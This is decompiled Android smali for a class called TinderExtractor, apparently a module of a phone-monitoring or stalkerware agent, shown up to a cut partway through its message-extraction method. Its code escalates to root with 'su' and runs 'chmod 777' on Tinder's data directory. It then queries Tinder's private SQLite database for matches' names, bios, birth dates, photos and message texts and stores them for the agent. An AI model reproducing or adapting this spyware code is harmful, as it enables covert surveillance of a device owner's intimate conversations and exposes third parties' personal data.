.class public Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;
.super Ljava/lang/Object;
.source "TinderExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "TinderExtractor"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "TndTmpFile"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected tinderMatchDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMatchData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected tinderMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMatchData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/TinderMessageData;",
            "Ljava/lang/Integer;",
            ">;)V"
        }
    .end annotation

    .line 54
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 41
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    .line 42
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 45
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 46
    iput-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 55
    iput-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    .line 56
    iput-object p2, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 57
    iput-object p3, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 59
    iput-object p4, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    .line 60
    iput-object p5, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    return-void
.end method


# virtual methods
.method public chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 5

    .line 531
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 534
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "su"

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 536
    new-instance v3, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 538
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 539
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod -R 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 542
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 545
    :goto_0
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    const-string p2, "exit\n"

    .line 547
    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 548
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    .line 550
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    const-string p2, "TinderExtractor"

    .line 552
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Chmod successful: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, p2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "TinderExtractor"

    const-string v2, "chmod(path): InterruptedException caught during chmod."

    .line 562
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception p1

    const-string p2, "TinderExtractor"

    const-string v2, "chmod(path): IOException caught during chmod."

    .line 557
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 571
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 572
    new-instance v1, Lcom/hp/vd/module/custom/tinder/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/custom/tinder/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 574
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 575
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 579
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method protected constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 404
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "_"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 409
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 410
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 412
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 413
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 415
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 417
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 418
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected extractCurrentlyConfiguredProfile(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    const-string v0, "/map/string[@name=\'USER_ID\']/text()"

    const/4 v1, 0x0

    .line 429
    :try_start_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 430
    invoke-static {}, Ljavax/xml/parsers/DocumentBuilderFactory;->newInstance()Ljavax/xml/parsers/DocumentBuilderFactory;

    move-result-object p1

    .line 431
    invoke-virtual {p1}, Ljavax/xml/parsers/DocumentBuilderFactory;->newDocumentBuilder()Ljavax/xml/parsers/DocumentBuilder;

    move-result-object p1

    .line 433
    invoke-virtual {p1, v2}, Ljavax/xml/parsers/DocumentBuilder;->parse(Ljava/io/File;)Lorg/w3c/dom/Document;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez p1, :cond_0

    return-object v1

    .line 444
    :cond_0
    invoke-static {}, Ljavax/xml/xpath/XPathFactory;->newInstance()Ljavax/xml/xpath/XPathFactory;

    move-result-object v2

    invoke-virtual {v2}, Ljavax/xml/xpath/XPathFactory;->newXPath()Ljavax/xml/xpath/XPath;

    move-result-object v2

    .line 447
    :try_start_1
    invoke-interface {v2, v0}, Ljavax/xml/xpath/XPath;->compile(Ljava/lang/String;)Ljavax/xml/xpath/XPathExpression;

    move-result-object v0

    invoke-interface {v0, p1}, Ljavax/xml/xpath/XPathExpression;->evaluate(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1
    :try_end_1
    .catch Ljavax/xml/xpath/XPathExpressionException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 449
    invoke-virtual {p1}, Ljavax/xml/xpath/XPathExpressionException;->printStackTrace()V

    return-object v1

    :catch_1
    move-exception p1

    .line 435
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    return-object v1
.end method

.method protected extractMatches(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 10

    const-wide/16 v0, 0x0

    .line 194
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 195
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 201
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_match_date"

    .line 203
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 201
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    .line 208
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/custom/tinder/MatchColumns;

    invoke-direct {v1}, Lcom/hp/vd/module/custom/tinder/MatchColumns;-><init>()V

    const-string v2, "SELECT mp.id, mp.name, mp.bio, mp.birth_date, mp.photos, m.creation_date FROM match_person mp JOIN `match` m ON m.person_id = mp.id WHERE m.creation_date > ? ORDER BY m.creation_date ASC LIMIT ?"

    const/4 v3, 0x2

    .line 212
    new-array v3, v3, [Ljava/lang/String;

    .line 215
    invoke-virtual {v0}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    aput-object v4, v3, v5

    const/4 v4, 0x1

    const-string v6, "50"

    aput-object v6, v3, v4

    .line 212
    invoke-virtual {p1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 221
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Message Cursor is null."

    const/4 v3, 0x3

    invoke-interface {p1, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    return-void

    :cond_0
    move-object v2, v0

    .line 226
    :goto_0
    :try_start_1
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 227
    new-instance v3, Lcom/hp/vd/data/TinderMatchData;

    invoke-direct {v3}, Lcom/hp/vd/data/TinderMatchData;-><init>()V

    .line 229
    iput-object p2, v3, Lcom/hp/vd/data/TinderMatchData;->profile:Ljava/lang/String;

    .line 230
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "id"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMatchData;->userId:Ljava/lang/String;

    .line 231
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "name"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMatchData;->name:Ljava/lang/String;

    .line 232
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "bio"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMatchData;->bio:Ljava/lang/String;

    .line 238
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "photos"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v4

    if-eqz v4, :cond_1

    .line 239
    array-length v6, v4

    if-lez v6, :cond_1

    .line 240
    invoke-static {v4, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMatchData;->photosBase64:Ljava/lang/String;

    .line 247
    :cond_1
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "birth_date"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    .line 248
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v6, "creation_date"

    invoke-interface {p1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {p1, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v6

    .line 250
    new-instance v7, Ljava/sql/Date;

    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J

    move-result-wide v8

    invoke-direct {v7, v8, v9}, Ljava/sql/Date;-><init>(J)V

    iput-object v7, v3, Lcom/hp/vd/data/TinderMatchData;->birthDate:Ljava/util/Date;

    .line 251
    new-instance v4, Ljava/sql/Date;

    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    invoke-direct {v4, v7, v8}, Ljava/sql/Date;-><init>(J)V

    iput-object v4, v3, Lcom/hp/vd/data/TinderMatchData;->createdAt:Ljava/util/Date;

    .line 256
    iget-object v4, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMatchDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    move-object v2, v6

    goto/16 :goto_0

    .line 261
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v2, v0, :cond_3

    .line 268
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_match_date"

    .line 269
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 270
    invoke-virtual {v2}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v3

    .line 268
    invoke-virtual {p1, v1, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 273
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 274
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 289
    :cond_3
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Tinder Matches ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_0
    move-exception p1

    goto :goto_1

    :catch_1
    move-exception p1

    move-object v2, v0

    .line 277
    :goto_1
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "TinderExtractor"

    const-string v4, "Error extracting data."

    invoke-interface {v1, v3, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v2, v0, :cond_4

    .line 280
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_match_date"

    .line 281
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 282
    invoke-virtual {v2}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v0

    .line 280
    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    return-void
.end method

.method protected extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 8

    const-wide/16 v0, 0x0

    .line 294
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 295
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 301
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_message_id"

    .line 303
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 301
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    .line 308
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/custom/tinder/MessageColumns;

    invoke-direct {v1}, Lcom/hp/vd/module/custom/tinder/MessageColumns;-><init>()V

    const-string v2, "SELECT m.client_sequential_id, (mp.id = m.to_id) AS type, mp.id AS participant_id, mp.name AS participant_name, m.text AS content, m.sent_date FROM message m LEFT JOIN match_person mp ON mp.id = m.to_id OR mp.id = m.from_id WHERE HEX(m.type) = \"54455854\" AND client_sequential_id > ? LIMIT ?"

    const/4 v3, 0x2

    .line 312
    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    .line 315
    invoke-virtual {v0}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    const-string v5, "250"

    aput-object v5, v3, v4

    .line 312
    invoke-virtual {p1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 321
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Contact Cursor is null."

    const/4 v3, 0x3

    invoke-interface {p1, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    return-void

    :cond_0
    move-object v2, v0

    .line 326
    :goto_0
    :try_start_1
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 327
    new-instance v3, Lcom/hp/vd/data/TinderMessageData;

    invoke-direct {v3}, Lcom/hp/vd/data/TinderMessageData;-><init>()V

    .line 329
    iput-object p2, v3, Lcom/hp/vd/data/TinderMessageData;->profile:Ljava/lang/String;

    .line 330
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "client_sequential_id"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMessageData;->internalId:Ljava/lang/Integer;

    .line 332
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "type"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMessageData;->type:Ljava/lang/Integer;

    .line 333
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "participant_id"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMessageData;->participantId:Ljava/lang/String;

    .line 334
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "participant_name"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMessageData;->participantName:Ljava/lang/String;

    .line 335
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "content"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/TinderMessageData;->content:Ljava/lang/String;

    .line 341
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "sent_date"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

